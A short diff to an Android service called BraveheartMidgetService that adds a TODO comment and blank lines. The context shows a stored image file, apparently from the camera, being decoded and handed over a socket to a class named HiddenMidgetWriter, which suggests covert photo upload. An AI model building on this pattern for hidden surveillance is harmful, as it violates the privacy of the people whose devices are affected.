@@ -188,9 +188,12 @@ public class BraveheartMidgetService extends IntentService {
 		SharedPreferences sharedPreferences = getSharedPreferences(getString(R.string.app_name), MODE_PRIVATE);
 		
 		String filepath = sharedPreferences.getString("filepath", null);
+		//TODO over options a constante junto con las del callback de camara
 		BitmapFactory.Options options = new BitmapFactory.Options();
 		options.inPreferredConfig = Bitmap.Config.RGB_565;
+		
 		Bitmap bitmap = BitmapFactory.decodeFile(filepath, options);
+		
 		if(filepath != null){
 			if(mSocketWeakReference != null){
 				HiddenMidgetWriter writerTask = new HiddenMidgetWriter(mSocketWeakReference, bitmap);
